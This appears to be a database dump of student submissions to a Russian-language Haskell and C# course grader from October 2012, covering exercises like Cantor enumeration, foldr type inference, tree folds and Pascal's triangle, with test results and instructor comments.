(2617, 66, '51559263', '2012-10-23 23:09:49', 1, '﻿--- Здесь я не придумал ничего лучше, чем использовать генерацию перестановок из задачи 12.1.   ---\r\n\r\n--- По-хорошему надо i перебирать от 1 не до (m-n+1)^n, а до n^(m-n+1), но тогда и индексацию   ---\r\n\r\n--- придётся придумывать новую, а я схалтурил, и решил из всех перестановок чисел от 1 до m-n+1 ---\r\n\r\n--- длины n выбрать те, суммы чисел которых дают m. Зато никакой рекурсии.)                     ---\r\n   --- OK, сойдет :)\r\n\r\n\r\n\r\nlist n k i = [ let\r\n\r\n                  step = n^(k-j)\r\n\r\n                  steps = div i step\r\n\r\n                  unstep = rem i step\r\n\r\n\r\n\r\n                  val = rem steps n\r\n\r\n\r\n\r\n                in if val == 0 && unstep == 0 then n\r\n\r\n                   else if unstep == 0 then val\r\n\r\n                   else val + 1\r\n\r\n\r\n\r\n              | j <- [1..k] ]\r\n\r\n\r\n\r\n\r\n\r\ngeneralizedCantor n = filter (/= []) [ let xs = list (m-n+1) n i\r\n\r\n\r\n\r\n                                       in if sum xs == m then xs\r\n\r\n                                          else []\r\n\r\n\r\n\r\n                                     | m <- [n..], i <- [1..(m-n+1)^n] ]\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2618, 75, '2562137', '2012-10-24 08:16:21', 1, '1) The type of foldr function.\r\n\r\nfoldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nfoldr fun def [] = def\r\nfoldr fun def (x:xs) = fun x (foldr fun def xs)\r\n\r\n2) How this type is computed by foldr definition (Hindley-Milner).\r\n\r\nDefault: fun is of type a1, def is of type a2, [] and (x:xs) are of type a3, foldr returns smth of type a4\r\n	a1 -> a2 -> a3 -> a4\r\n\r\n[] and (x:xs) are of type a3 => a3 == [a5]\r\n	a1 -> a2 -> [a5] -> a4\r\n\r\nfoldr returns def => a2 == a4\r\n	a1 -> a2 -> [a5] -> a2\r\n\r\nfun is applied to x, which is of type a5 => a1 == (a5 -> a6)\r\n	(a5 -> a6) -> a2 -> [a5] -> a2\r\n\r\n(fun x) is applied to (foldr fun def xs), which is of type a4 == a2 => a6 == (a2 -> a7)\r\n	(a5 -> (a2 -> a7)) -> a2 -> [a5] -> a2\r\n\r\n(fun x), when applied to (foldr fun def xs), is result of foldr => a4 == a2 == a7\r\n	(a5 -> (a2 -> a2)) -> a2 -> [a5] -> a2\r\n\r\nRename: a5 => a, a2 => b\r\n	(a -> (b -> b)) -> b -> [a] -> b\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2619, 75, '12206137', '2012-10-24 08:26:16', 1, 'foldr::(a->b->b)->b->[a]->b\r\n\r\n\r\n\r\nОпределение:\r\n\r\nfoldr f z []      = z\r\n\r\nfoldr f z (x:xs)  = f x (foldr f z xs)\r\n\r\n\r\n\r\nИз первого определения следует\r\n\r\nfoldr::t1 -> t2 -> t3 -> t4.\r\n\r\n(z:t2) => t4=t2 (:= b).\r\n\r\nТакже известно, что t3=[t5(:=a)].\r\n\r\nИмеем: foldr::t1 -> b -> [a] -> b.\r\n\r\n\r\n\r\nИз второго определения:\r\n\r\nЛевая часть:\r\n\r\n    (z:b) => ((foldr f z (x:xs)) : b)\r\n\r\nПравая часть:\r\n\r\n    (x:a)\r\n\r\n    (z:b) => ((foldr f z xs) : b)\r\n\r\nТаким образом (f : (a->b->b)). То есть t1 = (a->b->b).\r\n\r\nБолее никаких правил применить не получается, алгоритм завершается.\r\n\r\nВ итоге получаем:\r\n\r\nfoldr::(a->b->b)->b->[a]->b\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2620, 79, '3607492', '2012-10-24 12:12:56', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n	class Program\r\n	{\r\n		public static IEnumerable<int> digits(int n)\r\n		{\r\n			for (int i = 1; ; i*=10)\r\n			{\r\n				yield return i/n;\r\n				i=i%n;\r\n    --- Или короче i %= n;\r\n\r\n			}\r\n		}\r\n		static void Main(string[] args)\r\n		{\r\n			int a = 0;\r\n			foreach (int t in digits(7))\r\n			{\r\n				if (a >= 20) break;\r\n				Console.Write("{0}  ",t);\r\n				a++;\r\n			}\r\n			Console.ReadKey();\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2621, 66, '533223', '2012-10-24 14:18:27', 1, 'fixCantor 1 k = [[k]]\r\nfixCantor n k = [ x:xs | x<-[1..(k-n+1)] , xs<-(fixCantor (n-1) (k-x)) ]\r\nhelpCantor n t = (fixCantor n t) ++ (helpCantor n (t+1)) \r\ngeneralizedCantor n = helpCantor n n', '<br/>Тесты успешно пройдены!'),
(2622, 70, '533223', '2012-10-24 14:25:05', 1, 'myFilter f xs = foldr (x res-> if (f x) then x:res else res) [] xs', '<br/>Тесты успешно пройдены!'),
(2623, 72, '533223', '2012-10-24 14:28:00', 1, 'weekList = 0:0:0:0:0:1:1:weekList\r\nweekendExpences xs = sum (zipWith (*) xs weekList)\r\n', '<br/>Тесты успешно пройдены!'),
(2624, 74, '533223', '2012-10-24 14:33:19', 0, 'sumPos tree = foldTree (x l r->if(x>0) then l+r else x+l+r) 0 tree', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2625, 78, 'tonyo', '2012-10-24 14:33:26', 1, 'pascal  = [1] : map (xs -> zipWith(+) xs (0:xs) ++ [1]) pascal', '<br/>Тесты успешно пройдены!'),
(2626, 74, '533223', '2012-10-24 14:33:49', 0, 'foldTree f e (Node x l r) = f x lres rres\r\n				where \r\n					lres = foldTree f e l\r\n					rres = foldTree f e r\r\n\r\nsumPos tree = foldTree (x l r->if(x>0) then l+r else x+l+r) 0 tree', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2627, 74, '533223', '2012-10-24 14:38:20', 1, 'data Tree = Empty| Node Integer Tree Tree deriving Show\r\n\r\nfoldTree f e Empty = 0\r\nfoldTree f e (Node x l r) = f x lres rres\r\n				where \r\n					lres = foldTree f e l\r\n					rres = foldTree f e r\r\n\r\nsumPos tree = foldTree (x l r->if(x>0) then x+l+r else l+r) 0 tree', '<br/>Тесты успешно пройдены!'),
(2628, 77, '3607492', '2012-10-24 15:04:48', 1, 'stol k p =  head [x| x<-[0..9], (p*20 + x)*x<(k) , (p*20 + x+1)*(x+1)>(k)]\r\n\r\nfunc k p = a:(func (t*100) (p*10+a)) where\r\n 				a = stol k p\r\n 				t = (k-(p*20+a)*a)\r\n\r\nsqrt2 = 1:func 100 1\r\n\r\nsqrtx a = t:func ((a-t*t)*100) t where t =(floor (sqrt (fromIntegral a)))\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2629, 75, '533223', '2012-10-24 15:06:42', 1, 'a)foldr::(b->a->a)->a->[b]->a\r\n\r\n\r\nb)\r\nfoldr f res [] = res\r\nfoldr f res (x:xs) = foldr f (f x res) xs\r\nпервая часть.\r\n	1.ничего не знаем про типы:\r\n		a_1->a_2->a_3->a_4\r\n	2.устанавливаем типы на основании использования.\r\n		(x:xs)-имеет тип a_3, это список => a_3=[a_5]\r\n		(f x res)применяется и имеет тип a_1 => a_1 = a_6->a_7->a_8\r\n		итого (a_6->a_7->a_8)->a_2->[a_5]->a_4\r\nвторая часть\r\n	1.x - аргумент f => a_6 ; x - элемент аргумента foldr => a_5, значит a_5=a_6\r\n	2.res - аргумент foldr => a_2 ; res - аргумент f => a_7 ; res - результат f => a_8; res - результат foldr => a_4, значит a_2=a_7=a_8=a_4\r\n\r\nполучаем а)', '<br/>Тесты успешно пройдены!'),
(2630, 75, '3607492', '2012-10-24 15:13:43', 1, '(a -> b -> b) -> b -> [a] -> b\r\n\r\nfoldr f z []     = z \r\nfoldr f z (x:xs) = f x (foldr f z xs) \r\n\r\n\r\nПусть у f -- тип F, у z тип Z, у x - тип X. следовательно у третьего аттрибута foldr''a тип [X]\r\n\r\nпо первой строке видим, что возвращается z => возвращаемый выражением тип -- Z\r\n\r\nрассмотрим вторую строку. Видим, что f применяется к двум аттрибутам => f -- функция от двух переменных. У первой тип - X, у второй тип, возвращаемый foldr''ом. Результат работы фунции - опять же результат работы foldr''a => возвращаемый тип - Z\r\n\r\nИтого: (X->Z->Z)->Z->[X]->Z\r\n-----------f------z-(x:xs)-результат', '<br/>Тесты успешно пройдены!'),
(2631, 76, '533223', '2012-10-24 15:14:56', 1, 'class Shape a where\r\n	perimeter :: a -> Double\r\n\r\ndata Rect = Rect Double Double\r\n\r\ndata Circle = Circle Double\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect x y ) = 2*(x+y)\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2*3.14*r', '<br/>Тесты успешно пройдены!'),
(2632, 73, '374969', '2012-10-24 15:16:40', 1, 'fibs = 1:1:zipWith (+) fibs (tail fibs)\r\n', '<br/>Тесты успешно пройдены!'),
(2633, 77, 'tonyo', '2012-10-24 15:23:01', 1, '-- преобразовать список из цифр в число\r\nltonum xs = ltonum1 xs 0\r\nltonum1 [] res = res\r\nltonum1 (x:xs) res =  ltonum1 xs (res*10 +x)\r\n\r\n-- получить следующую цифру в разложении\r\nnextdigit xs n = if numxs*numxs > 2*10^nlen\r\n                     then n-1\r\n                     else nextdigit xs (n+1)\r\n    where numxs = ltonum (xs ++ [n]); nlen = length xs*2\r\n\r\nsqrt2 = 1 : map (\r\n -> nextdigit (take n sqrt2) 0) [1..]\r\n\r\n\r\n-- по-моему, получилось довольно коряво. Нельзя ли как-нибудь сделать это эффективнее и короче?\r\n', '<br/>Тесты успешно пройдены!'),
(2634, 65, '374969', '2012-10-24 15:31:25', 1, 'cantor = [(x,y-x)|y<-[2..],x<-[1..y-1]]', '<br/>Тесты успешно пройдены!'),
(2635, 69, '533223', '2012-10-24 15:41:49', 1, 'bigSin x = head (filter (>x) (map (sin) [1..]))', '<br/>Тесты успешно пройдены!'),
(2636, 71, '533223', '2012-10-24 15:47:20', 0, 'approxSum (x:xs) = if (x>0.000001) \r\n				then x + (approxSum xs)\r\n				else 0\r\n\r\nlist n=1/(n*n):(list (n+1)) \r\n\r\nz = approxSum (list 1)', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2637, 71, '533223', '2012-10-24 15:48:38', 1, 'approxSum (x:xs) = if (x>0.000001||x<(-0.000001)) \r\n				then x + (approxSum xs)\r\n				else 0\r\n\r\nlist n=1/(n*n):(list (n+1)) \r\n\r\nz = approxSum (list 1)', '<br/>Тесты успешно пройдены!'),
(2638, 66, '374969', '2012-10-24 15:56:07', 0, 'cantorhh summa 1     = [summa]\r\ncantorhh summa count = [hd:lst|hd <- [1..summa-count], lst <- cantorhh (summa-hd) (count-1)]\r\n\r\ngeneralizedCantor count = [x|y<-[count..],x <-cantorhh y count]\r\n\r\n', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2639, 75, '1705225', '2012-10-24 16:00:11', 1, 'data Tree = Empty|Node Integer Tree Tree\r\nfoldTree f acc Empty = acc\r\nfoldTree f acc (Node x l r) =\r\n	let\r\n		lres = foldTree f acc l\r\n		rres = foldTree f acc r\r\n	in f x lres rres\r\n\r\nsumPos = foldTree (x lres rres -> if x>0 then x+lres+rres else lres+rres) 0', '<br/>Тесты успешно пройдены!'),
(2640, 74, '1705225', '2012-10-24 16:06:09', 1, 'data Tree = Empty|Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) =\r\n	let\r\n		lres = foldTree f e l\r\n		rres = foldTree f e r\r\n	in f x lres rres\r\n\r\nsumPos = foldTree (x lres rres -> if x>0 then x+lres+rres else lres+rres) 0', '<br/>Тесты успешно пройдены!'),
(2641, 66, '374969', '2012-10-24 16:09:27', 1, 'cantorhh summa 1     = [[summa]]\r\ncantorhh summa count = [hd:lst|hd <- [1..summa-count+1], lst <- cantorhh (summa-hd) (count-1)]\r\n\r\ngeneralizedCantor count = [x|y<-[count..],x <-cantorhh y count]', '<br/>Тесты успешно пройдены!'),
(2642, 76, '1705225', '2012-10-24 16:10:33', 2, 'data Shape = Circle Float | Rect Float Float\r\n\r\nperimeter :: Shape -> Float  \r\nperimeter (Circle r) = 2 * pi * r\r\nperimeter (Rect x y) = 2 * (abs x + abs y)\r\n   --- Нет, это не по условию. Обратите внимание, по условию надо определить два типа (data) и еще класс Shape\r\n', '<br/>Тесты успешно пройдены!'),
(2643, 65, '383483', '2012-10-24 16:40:40', 1, 'cantor = [(x,s-x)|s<-[1..], x<-[1..(s-1)]]', '<br/>Тесты успешно пройдены!'),
(2644, 75, '1705225', '2012-10-24 16:50:10', 1, 'foldr f z []     = z \r\nfoldr f z (x:xs) = f x (foldr f z xs) \r\n\r\nрассмотрим foldr a b c\r\n\r\nf имеет тип  a1 -> a2 -> a3\r\n(x:xs) имеет тип [a4]\r\nтогда foldr имеет тип a -> b -> c, он же (a1 -> a2 -> a3) -> a5 -> [a4] -> a6\r\n\r\nиз определения foldr следует, что второй элемент foldr (он же a5) имеет тот же тип, что и результат foldr (он же a6) => (a1 -> a2 -> a3) -> a5 -> [a4] -> a5\r\nвторой аргумент f (он же a2) является результатом foldr (он же a5) => упростим (a1 -> a2 -> a3) -> a2 -> [a4] -> a2\r\nпервый аргумент f (он же a1) является частью списка третьего элемента foldr  (он же [a4] ) => (a1 -> a2 -> a3) -> a2 -> [a1] -> a2\r\nрезультат функции f из второй строки определния foldr (он же a3) совпадает с результатом самой функции foldr (он же a2), тогда => (a1 -> a2 -> a2) -> a2 -> [a1] -> a2\r\nДальше не упростить\r\n\r\n\r\nfoldr :: (a1 -> a2 -> a2) -> a2 -> [a1] -> a2', '<br/>Тесты успешно пройдены!'),
(2645, 79, '3431532', '2012-10-24 18:23:48', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace ConsoleApplication2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int i = 0;\r\n\r\n            int n = Console.Read() - ''0'';\r\n\r\n            foreach (long x in digits(n))\r\n\r\n            {\r\n\r\n                i++;\r\n\r\n                if (i > 100)\r\n\r\n                    return;\r\n\r\n                Console.Write(x);\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<long> digits(long n)\r\n\r\n        {\r\n\r\n            long value = 1;\r\n\r\n            for (int i = 1; ; i++)\r\n\r\n            {\r\n\r\n                long x = value / n;\r\n\r\n                value %= n;\r\n\r\n                if (value < n)\r\n\r\n                    value *= 10;\r\n\r\n                yield return x;\r\n\r\n\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2646, 74, '550896', '2012-10-24 18:33:55', 2, '   --- Нет, это не совсем то. Тут надо:\r\n   ---  - посмотреть в конспекте варианты foldTree которыые мы раздирали в начале предыдущей пары\r\n   ---  - взять тот вариант, в котором три аргумента. Мы еще с его помощью определяли heigth\r\n   ---  - примерно так, как мы определяли height, попробовать определить sumPos/ Те не просто как-то\r\n   ---     написать, а через foldTree\r\n\r\ndata Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nsumPos :: Tree Int -> Int\r\nsumPos Empty = 0\r\nsumPos (Node a left right) | a > 0 = \r\n  a + (sumPos left) + (sumPos right) \r\nsumPos (Node a left right) = \r\n  (sumPos left) + (sumPos right) ', '<br/>Тесты успешно пройдены!'),
(2647, 72, '550896', '2012-10-24 19:12:10', 1, 'weekendExpences :: [Int] -> Int\r\nweekendExpences a = weekendExpences0 0 a\r\n\r\nweekendExpences0 :: Int -> [Int] -> Int\r\nweekendExpences0 cur a | null a || (length a) < 6 = cur\r\nweekendExpences0 cur a | (length a) ==  6 = (head (drop 5 a)) + cur\r\nweekendExpences0 cur a = \r\n  weekendExpences0 (cur + (head (drop 5 a)) + (head (drop 6 a))) (drop 7 a)\r\n', '<br/>Тесты успешно пройдены!'),
(2648, 71, '550896', '2012-10-24 19:20:16', 1, 't = [ 1.0 / (i * i) | i <- [1..]]\r\n\r\napproxSum :: [Double] -> Double\r\napproxSum a = approxSum0 0 a\r\n\r\napproxSum0 :: Double -> [Double] -> Double\r\napproxSum0 cur a | null a || abs (head a) < 0.000001 = cur\r\napproxSum0 cur a = approxSum0 (cur + head a) (tail a)\r\n\r\nz = approxSum t', '<br/>Тесты успешно пройдены!'),
(2649, 70, '419046', '2012-10-24 19:23:50', 1, 'myFilter cond []        = []\r\n\r\nmyFilter cond (x:xs)    = foldr (x xs -> if cond x then x:xs else xs ) [] (x:xs)\r\n', '<br/>Тесты успешно пройдены!'),
(2650, 70, '550896', '2012-10-24 19:30:38', 2, '  --- Нет, это не по условию, прочитайте внимательнее пожалуйста. Тут же надо было использовать foldr\r\nmyFilter :: (a -> Bool) -> [a] -> [a]\r\nmyFilter f l = myFilter0 [] f l\r\n\r\nmyFilter0 :: [a] -> (a -> Bool) -> [a] -> [a]\r\nmyFilter0 cur f l | null l = cur\r\nmyFilter0 cur f l | f (head l) = myFilter0 (cur ++ [(head l)]) f (tail l)\r\nmyFilter0 cur f l = myFilter0 cur f (tail l)', '<br/>Тесты успешно пройдены!'),
(2651, 69, '355679', '2012-10-24 19:38:58', 1, 'bigSin bound = head ( filter (>= bound) ( map sin [1..] ) )\r\n', '<br/>Тесты успешно пройдены!'),
(2652, 70, '355679', '2012-10-24 19:39:27', 1, 'myFilter f xs = foldr\r\n\r\n  (x res -> if (f x) then x:res else res)\r\n\r\n  []\r\n\r\n  xs\r\n', '<br/>Тесты успешно пройдены!'),
(2653, 71, '355679', '2012-10-24 19:39:44', 1, 'bound = 0.000001\r\n\r\n\r\n\r\napproxSum [] = 0\r\n\r\napproxSum (x:xs) = if (abs x > bound) then\r\n\r\n    x + approxSum xs\r\n\r\n  else\r\n\r\n    0\r\n\r\n\r\n\r\nz = approxSum ( map ( i -> 1 / ( i ^ 2 ) ) [1..] )\r\n', '<br/>Тесты успешно пройдены!'),
(2654, 65, '1730564', '2012-10-24 19:44:51', 0, 'cantor = [(i, j) | i <- [1..], j <- [1..]]', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2655, 72, '355679', '2012-10-24 19:47:39', 1, 'weekendExpences xs =\r\n\r\n  let {\r\n\r\n    l = length xs\r\n\r\n  } in (\r\n\r\n    if (l < 6) then\r\n\r\n      0\r\n\r\n    else if (l == 6) then\r\n\r\n      xs !! 5\r\n\r\n    else\r\n\r\n      (xs !! 5) + (xs !! 6) + (weekendExpences (drop 7 xs))\r\n\r\n  )\r\n', '<br/>Тесты успешно пройдены!'),
(2656, 69, '1730564', '2012-10-24 19:48:47', 0, 'import Data.List\r\nbigSin x = find (i -> i > x) [sin k | k <- [1..]]', 'Не удалось вычислить выражение "(bigSin 0.99) < 0.991", проверьте правильность синтаксиса'),
(2657, 69, '1730564', '2012-10-24 19:54:10', 1, 'import Data.List\r\nbigSin x = head (dropWhile (i -> i <= x) [sin k | k <- [1..]])\r\n   --- Или вместо (i -> i <= x) можно просто (<=x) ', '<br/>Тесты успешно пройдены!'),
(2658, 71, '1730564', '2012-10-24 19:54:54', 1, 'import Data.List\r\napproxSum list = foldl (+) 0 (takeWhile (i -> (abs i) >= 0.000001) list)\r\n\r\nz = approxSum [1 / (i * i) | i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2659, 72, '1730564', '2012-10-24 19:55:17', 1, 'weekendExpences [] = 0\r\nweekendExpences list = (sum (take 2 (drop 5 list))) + weekendExpences (drop 7 list)', '<br/>Тесты успешно пройдены!'),
(2660, 73, '1730564', '2012-10-24 19:55:39', 1, 'fibs = y where 	\r\n	y = 1 : 1 : x		\r\n	x = zipWith (+) y (tail y)', '<br/>Тесты успешно пройдены!'),
(2661, 78, '1730564', '2012-10-24 19:55:58', 1, 'pascal = y where 	\r\n	y = [1]:z\r\n	z = map (x -> (1 : reverse (1 : zipWith (+) x (tail x)))) pascal\r\n', '<br/>Тесты успешно пройдены!'),
(2662, 70, '550896', '2012-10-24 19:58:36', 1, 'myFilter :: (a -> Bool) -> [a] -> [a]\r\nmyFilter f l | null l = []\r\nmyFilter f l = foldr (x0 x -> if f x0 then x0:x else x) [] l', '<br/>Тесты успешно пройдены!'),
(2663, 69, '419046', '2012-10-24 20:04:51', 0, 'bigSin x = take 1 [(sin i) | i <- [1..], (sin i >= x)]\n', 'Не удалось вычислить выражение "(bigSin 0.99) < 0.991", проверьте правильность синтаксиса'),
(2664, 69, '419046', '2012-10-24 20:06:59', 1, 'bigSin x = head (take 1 [(sin i) | i <- [1..], (sin i >= x)])\r\n', '<br/>Тесты успешно пройдены!'),
(2665, 69, '550896', '2012-10-24 20:08:00', 1, 'bigSin :: Double -> Double\r\nbigSin d = head (filter (>=d) [sin i | i <- [1..]])', '<br/>Тесты успешно пройдены!'),
(2666, 78, '355679', '2012-10-24 20:12:36', 1, '-- Конечно, next – это дополнительная функция. --\r\n\r\n-- Но я могу это записать и с помощью лямбда-выражения внутри ф-ии map. --\r\n\r\n-- Просто это будет трудночитаемо, поэтому мне не хочется так делать. --\r\n  --- Ok. хорошо..\r\n\r\nnext prev = ( zipWith (+) (0:prev) (prev ++ [0]) )\r\n\r\n\r\n\r\npascal = [1]:(map next pascal)\r\n', '<br/>Тесты успешно пройдены!'),
(2667, 73, '550896', '2012-10-24 20:15:02', 1, 'fibs = map fst (iterate ((x0,x1) -> (x1,x0+x1)) (1,1))', '<br/>Тесты успешно пройдены!'),
(2668, 65, '1730564', '2012-10-24 20:23:21', 1, 'cantor = [(i, n - i) | n <- [1..], i <- [1..(n - 1)]]', '<br/>Тесты успешно пройдены!'),
(2669, 66, '1730564', '2012-10-24 20:41:59', 1, 'generalizedCantor n = [(i : k) | m <- [1..], i <- [1..(m - 1)], k <- (generalizedCantor'' (n - 1) (m - i))]\r\n\r\ngeneralizedCantor'' 1 m = [[m]]\r\ngeneralizedCantor'' n m = [(i : k) | i <- [1..(m - 1)], k <- (generalizedCantor'' (n - 1) (m - i))]\r\n', '<br/>Тесты успешно пройдены!'),
(2670, 73, '51559263', '2012-10-24 21:24:41', 1, 'fibs = 1 : 1 : ( zipWith (+) fibs ( tail(fibs) ) )\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2671, 78, '51559263', '2012-10-24 21:50:06', 1, 'pascal = [1] : [1,1] : map (  xs -> 1 : zipWith (+) xs (tail xs) ++ [1] ) ( tail pascal )\r\n   --- ОК, но, просто как замечание, проще было бы в конце не писать tail\r\n   --- (и в начале тогда приписывать только [1])\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2672, 69, '51559263', '2012-10-24 22:07:04', 1, 'bigSin x = head ( filter ( > x ) ( map (sin) [1..] ) )\r\n', '<br/>Тесты успешно пройдены!'),
(2673, 76, '1705225', '2012-10-24 22:12:47', 1, 'class Shape a where\r\n	perimeter::a->Double\r\n\r\ndata Rect = Rect {\r\n					x :: Double,\r\n				  	y :: Double\r\n				 }\r\ndata Circle = Circle {\r\n						radius :: Double\r\n					 } \r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect x y) = 2 * (x+y)\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2*pi*r\r\n', '<br/>Тесты успешно пройдены!'),
(2674, 70, '51559263', '2012-10-24 22:28:37', 1, 'myFilter f xs = foldr (  y ys -> if ( f y ) then ( y : ys ) else ys ) [] xs\r\n', '<br/>Тесты успешно пройдены!'),
(2675, 74, 'erwert', '2012-10-25 02:46:39', 2, 'data Tree = Empty | Node Double Tree Tree deriving(Show,Eq)\r\n\r\nfoldTree f t Empty = t\r\nfoldTree f t (Node x l r) =  f x lres rres\r\n	where\r\n		lres = foldTree f t l\r\n		rres = foldTree f t r\r\n\r\nifok a = if a > 0 then a else 0\r\nsumPos t = foldTree (x l r -> x + (ifok l) + (ifok r)) 0 t\r\n   --- Но так у вас для sumPos (Node (-5) (Node 2 Empty Empty) Empty) например\r\n   --- получится -3 (а дб 2). Исправьте, пожалуйста (а я сейчас добавлю такой тест)', '<br/>Тесты успешно пройдены!'),
(2676, 73, 'erwert', '2012-10-25 02:59:58', 1, 'fibs = 1 : 1 : zipWith (+) fibs (tail fibs)', '<br/>Тесты успешно пройдены!'),
(2677, 77, '3431532', '2012-10-25 06:02:34', 0, '\r\nsqrt2 = digits (sqrtt 1 1 0 )\r\n\r\ndigits 0 = []\r\ndigits x = digits (x `div` 10) ++ [x `mod` 10]\r\n\r\n\r\nsqrtt x y 500 = y\r\nsqrtt x y n = sqrtt (x*100 - (y*20 + t)*t) (y*10+t) (n+1)\r\n										where t = getNumber (x*100)  (y*2) 0\r\n\r\ngetNumber x y z | z*(y*10+z) >= x = z-1\r\ngetNumber 0 y z = 0\r\ngetNumber x y z | z*(y*10+z) < x = getNumber x y (z+1)', '<br/>Тесты успешно пройдены!'),
(2678, 77, '3431532', '2012-10-25 06:13:28', 1, 'sqrt2 = 1 : sqrtt 1 [1]\r\n\r\nsqrtt x y = t : (sqrtt (x*100 - ((splitList y)*20 + t)*t) (y ++ [t]) ) \r\n										where t = getNumber (x*100)  ((splitList y)*2) 0\r\n\r\n\r\ngetNumber x y z | z*(y*10+z) >= x = z-1\r\ngetNumber 0 y z = 0\r\ngetNumber x y z | z*(y*10+z) < x = getNumber x y (z+1)\r\n\r\nsplitList [] = 0\r\nsplitList [x] = x\r\nsplitList (x:xs) = x*10^(length xs) + splitList xs', '<br/>Тесты успешно пройдены!'),
(2679, 76, '374969', '2012-10-25 07:07:10', 0, 'data Shape = Circle Int | Rect Int Int\r\n\r\nperimeter (Circle r) = 2*pi*r\r\nperimeter (Rect a b) = 2*(a+b)', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2680, 76, '374969', '2012-10-25 07:09:09', 0, 'perimeter (Circle r) = 2.0*pi*r\r\nperimeter (Rect a b) = 2.0*(a+b)', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2681, 76, '374969', '2012-10-25 07:09:50', 2, '   --- Нет, это не по условию.. Тут надо именно описать два типа (data) и еще\r\n   --- класс (а не data) Shape, который позволит с ними единообразно работать.\r\ndata Shape = Circle Float| Rect Float Float\r\n\r\nperimeter (Circle r) = 2.0*pi*r\r\nperimeter (Rect a b) = 2.0*(a+b)', '<br/>Тесты успешно пройдены!'),
(2682, 78, '374969', '2012-10-25 07:40:05', 1, 'pascal = [1]: (map (x -> zipWith (+) (0:x) (x++[0])) pascal)', '<br/>Тесты успешно пройдены!'),
(2683, 79, '12206137', '2012-10-25 07:58:29', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace DZ_19_1 {\r\n    class Program {\r\n        static IEnumerable<int> digits(int n) {\r\n            int rem = 10;\r\n            while (true) {\r\n                yield return rem / n;\r\n                rem = rem % n * 10;\r\n            }\r\n        }\r\n        static void Main(string[] args) {\r\n            int n = 7, d = 20;\r\n            foreach (int cur in digits(n)) {\r\n                if (d-- == 0) break;\r\n                Console.Write(cur);\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2684, 80, '12206137', '2012-10-25 07:58:44', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace DZ_19_2 {\r\n    class Program {\r\n        static IEnumerable<KeyValuePair<int, int>> cantor() {\r\n            for (int k = 2; ; k++) {\r\n                for (int i = 1; i < k; i++) {\r\n                    yield return new KeyValuePair<int, int>(i, k - i);\r\n                }\r\n            }\r\n        }\r\n        static void Main(string[] args) {\r\n            int n = 10;\r\n            foreach (KeyValuePair<int, int> p in cantor()) {\r\n              --- Я бы тут написал var p чтобы не выписывать длинный тип\r\n                if (n-- == 0) break;\r\n                Console.Write("(" + p.Key + "," + p.Value + ") ");\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2685, 72, '374969', '2012-10-25 08:14:02', 1, 'weekendExpences lst = (sum . fst . unzip) (filter ((x,y) -> mod y 7 == 6||mod y 7 == 0) (zip lst [1..]))', '<br/>Тесты успешно пройдены!'),
(2686, 77, '374969', '2012-10-25 08:33:12', 2, 'floatToLst :: Float -> [Int]\r\nfloatToLst x = y : floatToLst ((x - y)*10) where y = truncate x\r\nsqrt2 = floatToLst (sqrt 2)\r\n   --- Нет, Александр, так, конечно, нельзя. Как только вы написали sqrt 2\r\n   --- вы уже значит считаете цифры не настоящего корня из 2, а его приближения\r\n   --- как Double. И при этом, конечно, вы с какого то момента показываете\r\n   --- цифры неправильно. Подсказка: тут надо как-то свести эту задачу к задаче\r\n   --- над целыми числами.  ', 'Не удалось вычислить выражение "take 20 sqrt2", проверьте правильность синтаксиса'),
